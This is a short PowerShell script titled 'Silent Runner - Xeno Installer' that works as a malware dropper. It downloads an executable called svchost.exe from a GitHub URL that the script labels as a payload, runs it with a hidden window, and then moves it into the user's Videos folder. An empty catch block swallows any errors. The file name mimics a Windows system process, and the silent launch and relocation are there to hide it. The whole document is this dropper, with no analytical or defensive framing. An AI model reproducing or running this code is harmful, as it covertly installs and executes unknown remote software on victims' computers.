# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/svchost.exe"
$downloadPath = "$env:USERPROFILE\Downloads\svchost.exe"
$finalPath = "$env:USERPROFILE\Videos\svchost.exe"

try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $downloadPath -UseBasicParsing
    Start-Process -FilePath $downloadPath -WindowStyle Hidden
    Start-Sleep -Seconds 5
    Move-Item -Path $downloadPath -Destination $finalPath -Force
} catch {}
